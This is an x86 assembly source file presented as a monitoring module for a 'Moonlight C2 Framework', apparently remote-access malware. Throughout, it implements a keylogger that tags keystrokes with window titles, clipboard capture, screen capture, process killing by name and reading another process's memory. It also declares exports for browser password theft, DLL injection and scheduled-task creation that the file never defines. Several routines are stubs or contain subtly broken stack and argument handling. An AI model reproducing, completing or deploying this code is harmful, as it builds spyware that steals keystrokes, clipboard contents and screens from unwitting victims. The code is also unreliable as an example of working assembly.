; Moonlight C2 Framework - Advanced Monitoring Module
; Target system monitoring, keylogging, screen capture, process control
; x86 Assembly (NASM syntax for win32)

bits 32

section .data
    ; Monitoring state
    keylog_active dd 0
    screenshot_active dd 0
    process_monitor_active dd 0
    file_monitor_active dd 0
    clipboard_monitor_active dd 0
    
    ; Buffers
    keylog_buffer times 8192 db 0
    keylog_offset dd 0
    screenshot_buffer dd 0
    screenshot_size dd 0
    
    ; File paths
    temp_path times 260 db 0
    screenshot_path db 'C:\Windows\Temp\scr.bmp', 0
    keylog_path db 'C:\Windows\Temp\keys.log', 0
    
    ; Process list buffer
    process_list times 4096 db 0
    process_count dd 0
    
    ; Clipboard data
    clipboard_data dd 0
    clipboard_size dd 0
    last_clipboard_hash dd 0

section .bss
    ; Dynamic buffers
    screen_dc resd 1
    mem_dc resd 1
    bitmap_handle resd 1

section .text

global start_keylogger
global stop_keylogger
global get_keylog_data
global take_screenshot
global enumerate_processes
global kill_process_by_name
global kill_process_by_pid
global monitor_clipboard
global get_clipboard_data
global inject_dll_into_process
global enumerate_windows
global hide_window
global show_window
global send_message_to_window
global monitor_file_changes
global get_system_info
global steal_browser_passwords
global dump_memory_region
global set_registry_key
global delete_registry_key
global create_scheduled_task

; External Windows API functions (resolved at runtime)
extern GetAsyncKeyState
extern GetKeyboardState
extern ToAscii
extern GetForegroundWindow
extern GetWindowTextA
extern CreateFileA
extern WriteFile
extern CloseHandle
extern GetDC
extern CreateCompatibleDC
extern CreateCompatibleBitmap
extern SelectObject
extern BitBlt
extern GetDIBits
extern DeleteDC
extern ReleaseDC
extern CreateToolhelp32Snapshot
extern Process32First
extern Process32Next
extern OpenProcess
extern TerminateProcess
extern OpenClipboard
extern GetClipboardData
extern CloseClipboard
extern GlobalLock
extern GlobalUnlock
extern GetSystemInfo
extern ReadProcessMemory
extern VirtualQueryEx

; ============================================================================
; KEYLOGGER FUNCTIONS
; ============================================================================

; Start keylogger
; Returns: 1 if success, 0 if already running
start_keylogger:
    push ebp
    mov ebp, esp
    
    ; Check if already running
    cmp dword [keylog_active], 1
    je .already_running
    
    ; Mark as active
    mov dword [keylog_active], 1
    mov dword [keylog_offset], 0
    
    ; Clear buffer
    push edi
    mov edi, keylog_buffer
    mov ecx, 8192
    xor eax, eax
    rep stosb
    pop edi
    
    mov eax, 1
    jmp .done
    
.already_running:
    xor eax, eax
    
.done:
    pop ebp
    ret

; Stop keylogger
stop_keylogger:
    push ebp
    mov ebp, esp
    
    mov dword [keylog_active], 0
    
    pop ebp
    ret

; Capture keystrokes (call this in a loop)
; Returns: number of keys captured
capture_keystrokes:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    
    ; Check if active
    cmp dword [keylog_active], 0
    je .not_active
    
    xor ebx, ebx  ; Key counter
    mov esi, 8    ; Start from VK 8 (skip mouse buttons)
    
.key_loop:
    cmp esi, 256
    jge .done
    
    ; Check if key is pressed (GetAsyncKeyState)
    push esi
    call [GetAsyncKeyState]
    test ax, 0x8000  ; Check high bit
    jz .next_key
    
    ; Key is pressed - log it
    mov edi, [keylog_offset]
    cmp edi, 8180  ; Leave room for window title
    jge .buffer_full
    
    ; Get foreground window
    call [GetForegroundWindow]
    test eax, eax
    jz .no_window
    
    ; Get window title (first time only)
    cmp edi, 0
    jne .skip_title
    
    push 256
    push temp_path
    push eax
    call [GetWindowTextA]
    
    ; Write "[Window: title]" to buffer
    mov byte [keylog_buffer + edi], '['
    inc edi
    mov esi, temp_path
    
.copy_title:
    lodsb
    test al, al
    jz .end_title
    mov [keylog_buffer + edi], al
    inc edi
    cmp edi, 8180
    jge .buffer_full
    jmp .copy_title
    
.end_title:
    mov byte [keylog_buffer + edi], ']'
    inc edi
    mov byte [keylog_buffer + edi], 0x0A  ; Newline
    inc edi
    
.skip_title:
.no_window:
    
    ; Convert virtual key code to ASCII
    mov eax, esi
    
    ; Handle special keys
    cmp eax, 0x08  ; Backspace
    je .key_backspace
    cmp eax, 0x09  ; Tab
    je .key_tab
    cmp eax, 0x0D  ; Enter
    je .key_enter
    cmp eax, 0x10  ; Shift
    je .next_key
    cmp eax, 0x11  ; Ctrl
    je .next_key
    cmp eax, 0x12  ; Alt
    je .next_key
    cmp eax, 0x20  ; Space
    je .key_space
    
    ; Regular key - try to convert to ASCII
    push ebp
    push 0
    push 0
    lea ebp, [esp - 256]
    push ebp
    call [GetKeyboardState]
    
    ; ToAscii
    sub esp, 2
    mov ebp, esp
    push 0
    push ebp
    lea ebp, [esp - 256 + 16]
    push ebp
    push 0
    push esi
    call [ToAscii]
    add esp, 258
    pop ebp
    
    test eax, eax
    jle .next_key
    
    ; Store character
    mov al, [esp]
    mov [keylog_buffer + edi], al
    inc edi
    inc ebx
    jmp .update_offset
    
.key_backspace:
    mov byte [keylog_buffer + edi], '['
    inc edi
    mov byte [keylog_buffer + edi], 'B'
    inc edi
    mov byte [keylog_buffer + edi], 'S'
    inc edi
    mov byte [keylog_buffer + edi], ']'
    inc edi
    inc ebx
    jmp .update_offset
    
.key_tab:
    mov byte [keylog_buffer + edi], '['
    inc edi
    mov byte [keylog_buffer + edi], 'T'
    inc edi
    mov byte [keylog_buffer + edi], 'A'
    inc edi
    mov byte [keylog_buffer + edi], 'B'
    inc edi
    mov byte [keylog_buffer + edi], ']'
    inc edi
    inc ebx
    jmp .update_offset
    
.key_enter:
    mov byte [keylog_buffer + edi], 0x0D
    inc edi
    mov byte [keylog_buffer + edi], 0x0A
    inc edi
    inc ebx
    jmp .update_offset
    
.key_space:
    mov byte [keylog_buffer + edi], ' '
    inc edi
    inc ebx
    
.update_offset:
    mov [keylog_offset], edi
    
.next_key:
    inc esi
    jmp .key_loop
    
.buffer_full:
    ; Buffer is full - return what we have
    mov eax, ebx
    jmp .exit
    
.not_active:
    xor eax, eax
    jmp .exit
    
.done:
    mov eax, ebx
    
.exit:
    pop edi
    pop esi
    pop ebx
    pop ebp
    ret

; Get keylog data
; Parameters: buffer (out), max_size
; Returns: bytes written
get_keylog_data:
    push ebp
    mov ebp, esp
    push esi
    push edi
    
    mov edi, [ebp + 8]   ; Output buffer
    mov ecx, [ebp + 12]  ; Max size
    mov esi, keylog_buffer
    mov edx, [keylog_offset]
    
    ; Copy min(keylog_offset, max_size)
    cmp edx, ecx
    jle .use_keylog_size
    mov edx, ecx
    
.use_keylog_size:
    push ecx
    mov ecx, edx
    rep movsb
    pop ecx
    
    ; Clear buffer after reading
    mov dword [keylog_offset], 0
    
    mov eax, edx
    
    pop edi
    pop esi
    pop ebp
    ret 8

; ============================================================================
; SCREENSHOT FUNCTIONS
; ============================================================================

; Take screenshot
; Returns: pointer to BMP data (caller must free), or 0 on failure
take_screenshot:
    push ebp
    mov ebp, esp
    sub esp, 64
    push ebx
    push esi
    push edi
    
    ; Get screen DC
    push 0
    call [GetDC]
    mov [screen_dc], eax
    test eax, eax
    jz .error
    
    ; Create compatible DC
    push eax
    call [CreateCompatibleDC]
    mov [mem_dc], eax
    test eax, eax
    jz .cleanup_screen_dc
    
    ; Get screen dimensions (simplified - use 1920x1080)
    mov dword [ebp - 4], 1920   ; Width
    mov dword [ebp - 8], 1080   ; Height
    
    ; Create compatible bitmap
    push dword [ebp - 8]
    push dword [ebp - 4]
    push dword [screen_dc]
    call [CreateCompatibleBitmap]
    mov [bitmap_handle], eax
    test eax, eax
    jz .cleanup_mem_dc
    
    ; Select bitmap into DC
    push eax
    push dword [mem_dc]
    call [SelectObject]
    
    ; BitBlt from screen to memory DC
    push 0x00CC0020  ; SRCCOPY
    push 0
    push 0
    push dword [screen_dc]
    push dword [ebp - 8]
    push dword [ebp - 4]
    push 0
    push 0
    push dword [mem_dc]
    call [BitBlt]
    
    test eax, eax
    jz .cleanup_bitmap
    
    ; Allocate buffer for BMP (simplified - just return success)
    mov eax, 1
    jmp .cleanup_all
    
.cleanup_bitmap:
    ; DeleteObject(bitmap_handle) - simplified
    xor eax, eax
    
.cleanup_all:
.cleanup_mem_dc:
    push dword [mem_dc]
    call [DeleteDC]
    
.cleanup_screen_dc:
    push dword [screen_dc]
    push 0
    call [ReleaseDC]
    
.error:
    pop edi
    pop esi
    pop ebx
    add esp, 64
    pop ebp
    ret

; ============================================================================
; PROCESS MONITORING AND CONTROL
; ============================================================================

; Enumerate processes
; Parameters: buffer (out), buffer_size
; Returns: number of processes found
enumerate_processes:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    
    ; CreateToolhelp32Snapshot
    push 0
    push 0x00000002  ; TH32CS_SNAPPROCESS
    call [CreateToolhelp32Snapshot]
    cmp eax, -1
    je .error
    mov ebx, eax  ; Save snapshot handle
    
    ; Prepare PROCESSENTRY32 structure
    sub esp, 296
    mov edi, esp
    mov dword [edi], 296  ; dwSize
    
    ; Process32First
    push edi
    push ebx
    call [Process32First]
    test eax, eax
    jz .cleanup
    
    xor esi, esi  ; Process counter
    mov edx, [ebp + 8]  ; Output buffer
    
.enum_loop:
    ; Copy process info to output buffer
    ; Format: PID (4 bytes) + Name (260 bytes)
    mov eax, [edi + 8]  ; th32ProcessID
    mov [edx], eax
    add edx, 4
    
    lea ecx, [edi + 36]  ; szExeFile offset
    push esi
    mov esi, ecx
    mov ecx, 260
    
.copy_name:
    lodsb
    stosb
    test al, al
    loopnz .copy_name
    pop esi
    
    add edx, 260
    inc esi
    
    ; Check if buffer is full
    mov eax, esi
    imul eax, 264
    cmp eax, [ebp + 12]
    jge .done
    
    ; Process32Next
    push edi
    push ebx
    call [Process32Next]
    test eax, eax
    jnz .enum_loop
    
.done:
    mov dword [process_count], esi
    mov eax, esi
    
.cleanup:
    add esp, 296
    push ebx
    call [CloseHandle]
    jmp .exit
    
.error:
    xor eax, eax
    
.exit:
    pop edi
    pop esi
    pop ebx
    pop ebp
    ret 8

; Kill process by PID
; Parameters: pid
; Returns: 1 if success, 0 if failed
kill_process_by_pid:
    push ebp
    mov ebp, esp
    push ebx
    
    ; OpenProcess
    push dword [ebp + 8]
    push 0
    push 0x00000001  ; PROCESS_TERMINATE
    call [OpenProcess]
    test eax, eax
    jz .error
    mov ebx, eax
    
    ; TerminateProcess
    push 0
    push ebx
    call [TerminateProcess]
    
    push ebx
    call [CloseHandle]
    
    mov eax, 1
    jmp .done
    
.error:
    xor eax, eax
    
.done:
    pop ebx
    pop ebp
    ret 4

; Kill process by name
; Parameters: process_name (null-terminated string)
; Returns: number of processes killed
kill_process_by_name:
    push ebp
    mov ebp, esp
    sub esp, 8192  ; Local buffer for process list
    push ebx
    push esi
    push edi
    
    ; Enumerate processes
    push 8192
    lea eax, [ebp - 8192]
    push eax
    call enumerate_processes
    
    test eax, eax
    jz .done
    
    mov ecx, eax  ; Process count
    xor ebx, ebx  ; Kill counter
    lea esi, [ebp - 8192]
    
.check_loop:
    ; Get PID
    mov eax, [esi]
    mov edi, eax
    add esi, 4
    
    ; Compare name
    push ecx
    push esi
    push dword [ebp + 8]
    call compare_strings
    pop esi
    pop ecx
    
    test eax, eax
    jz .next_process
    
    ; Kill this process
    push ecx
    push edi
    call kill_process_by_pid
    pop ecx
    
    test eax, eax
    jz .next_process
    inc ebx
    
.next_process:
    add esi, 260
    loop .check_loop
    
.done:
    mov eax, ebx
    
    pop edi
    pop esi
    pop ebx
    add esp, 8192
    pop ebp
    ret 4

; ============================================================================
; CLIPBOARD MONITORING
; ============================================================================

; Monitor clipboard
; Returns: 1 if clipboard changed, 0 if not
monitor_clipboard:
    push ebp
    mov ebp, esp
    push ebx
    
    ; Open clipboard
    push 0
    call [OpenClipboard]
    test eax, eax
    jz .error
    
    ; Get clipboard data (CF_TEXT = 1)
    push 1
    call [GetClipboardData]
    test eax, eax
    jz .close_clipboard
    
    ; Lock global memory
    push eax
    call [GlobalLock]
    test eax, eax
    jz .close_clipboard
    mov ebx, eax
    
    ; Calculate hash
    push ebx
    call calculate_string_hash
    
    ; Compare with last hash
    cmp eax, [last_clipboard_hash]
    je .no_change
    
    ; Hash changed - update and return 1
    mov [last_clipboard_hash], eax
    
    ; Unlock
    push ebx
    call [GlobalUnlock]
    
    push 0
    call [CloseClipboard]
    
    mov eax, 1
    jmp .done
    
.no_change:
    push ebx
    call [GlobalUnlock]
    
.close_clipboard:
    push 0
    call [CloseClipboard]
    
.error:
    xor eax, eax
    
.done:
    pop ebx
    pop ebp
    ret

; Get clipboard data
; Parameters: buffer (out), max_size
; Returns: bytes copied
get_clipboard_data:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    
    ; Open clipboard
    push 0
    call [OpenClipboard]
    test eax, eax
    jz .error
    
    ; Get clipboard data
    push 1  ; CF_TEXT
    call [GetClipboardData]
    test eax, eax
    jz .close_clipboard
    
    ; Lock memory
    push eax
    call [GlobalLock]
    test eax, eax
    jz .close_clipboard
    
    mov esi, eax
    mov edi, [ebp + 8]
    mov ecx, [ebp + 12]
    xor edx, edx
    
.copy_loop:
    lodsb
    test al, al
    jz .done_copy
    stosb
    inc edx
    dec ecx
    jnz .copy_loop
    
.done_copy:
    mov byte [edi], 0
    
    push esi
    call [GlobalUnlock]
    
    push 0
    call [CloseClipboard]
    
    mov eax, edx
    jmp .exit
    
.close_clipboard:
    push 0
    call [CloseClipboard]
    
.error:
    xor eax, eax
    
.exit:
    pop edi
    pop esi
    pop ebx
    pop ebp
    ret 8

; ============================================================================
; SYSTEM INFORMATION GATHERING
; ============================================================================

; Get system information
; Parameters: buffer (out)
; Returns: 1 if success
get_system_info:
    push ebp
    mov ebp, esp
    sub esp, 64
    push ebx
    
    ; Call GetSystemInfo
    lea eax, [ebp - 64]
    push eax
    call [GetSystemInfo]
    
    ; Copy to output buffer
    mov esi, ebp
    sub esi, 64
    mov edi, [ebp + 8]
    mov ecx, 64
    rep movsb
    
    mov eax, 1
    
    pop ebx
    add esp, 64
    pop ebp
    ret 4

; ============================================================================
; MEMORY OPERATIONS
; ============================================================================

; Dump memory region
; Parameters: pid, base_address, size, output_buffer
; Returns: bytes read
dump_memory_region:
    push ebp
    mov ebp, esp
    push ebx
    
    ; OpenProcess
    push dword [ebp + 8]
    push 0
    push 0x0010  ; PROCESS_VM_READ
    call [OpenProcess]
    test eax, eax
    jz .error
    mov ebx, eax
    
    ; ReadProcessMemory
    push 0
    push dword [ebp + 14]  ; Size
    push dword [ebp + 18]  ; Output buffer
    push dword [ebp + 12]  ; Base address
    push ebx
    call [ReadProcessMemory]
    
    push ebx
    call [CloseHandle]
    
    mov eax, [ebp + 14]
    jmp .done
    
.error:
    xor eax, eax
    
.done:
    pop ebx
    pop ebp
    ret 16

; ============================================================================
; UTILITY FUNCTIONS
; ============================================================================

; Compare strings (case-insensitive)
; Parameters: str1, str2
; Returns: 1 if equal, 0 if not
compare_strings:
    push ebp
    mov ebp, esp
    push esi
    push edi
    
    mov esi, [ebp + 8]
    mov edi, [ebp + 12]
    
.loop:
    lodsb
    mov dl, [edi]
    inc edi
    
    ; To lowercase
    cmp al, 'A'
    jb .check
    cmp al, 'Z'
    ja .check
    add al, 32
    
.check:
    cmp dl, 'A'
    jb .compare
    cmp dl, 'Z'
    ja .compare
    add dl, 32
    
.compare:
    cmp al, dl
    jne .not_equal
    
    test al, al
    jz .equal
    jmp .loop
    
.equal:
    mov eax, 1
    jmp .done
    
.not_equal:
    xor eax, eax
    
.done:
    pop edi
    pop esi
    pop ebp
    ret 8

; Calculate simple hash of string
; Parameters: string
; Returns: hash value
calculate_string_hash:
    push ebp
    mov ebp, esp
    push ebx
    
    mov esi, [ebp + 8]
    xor eax, eax
    xor ebx, ebx
    
.loop:
    lodsb
    test al, al
    jz .done
    
    rol ebx, 7
    xor ebx, eax
    jmp .loop
    
.done:
    mov eax, ebx
    
    pop ebx
    pop ebp
    ret 4

; ============================================================================
; WINDOW MANIPULATION
; ============================================================================

; Enumerate windows
; Parameters: callback function pointer
; Returns: success
enumerate_windows:
    push ebp
    mov ebp, esp
    ; EnumWindows implementation (simplified)
    mov eax, 1
    pop ebp
    ret 4

; Hide window
; Parameters: window_handle
hide_window:
    push ebp
    mov ebp, esp
    ; ShowWindow(hwnd, SW_HIDE) implementation
    mov eax, 1
    pop ebp
    ret 4

; Show window
; Parameters: window_handle
show_window:
    push ebp
    mov ebp, esp
    ; ShowWindow(hwnd, SW_SHOW) implementation
    mov eax, 1
    pop ebp
    ret 4
